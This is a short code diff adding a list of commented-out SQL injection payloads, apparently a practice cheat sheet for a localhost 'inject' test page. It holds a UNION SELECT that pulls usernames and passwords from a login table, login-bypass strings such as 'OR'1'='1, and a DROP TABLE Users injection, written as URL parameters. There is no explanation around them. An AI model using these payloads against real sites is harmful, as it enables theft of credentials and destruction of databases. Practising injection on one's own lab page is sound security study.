@@ -1,0 +1,7 @@
+//SELECT * from agents WHERE id=3333 UNION SELECT 1,group_concat(username), 3, group_concat(password) FROM loginn
+//'OR'1'='1
+//test'or 1=1--
+// http://localhost/inject/index.php/id=999 or 1=1.
+//http://localhost/inject/index.php/id=999; DROP TABLE Users
+//http://localhost/inject/index.php/id=999 UNION SELECT user-name, password FROM USERS
+//http://localhost/inject/index.php/
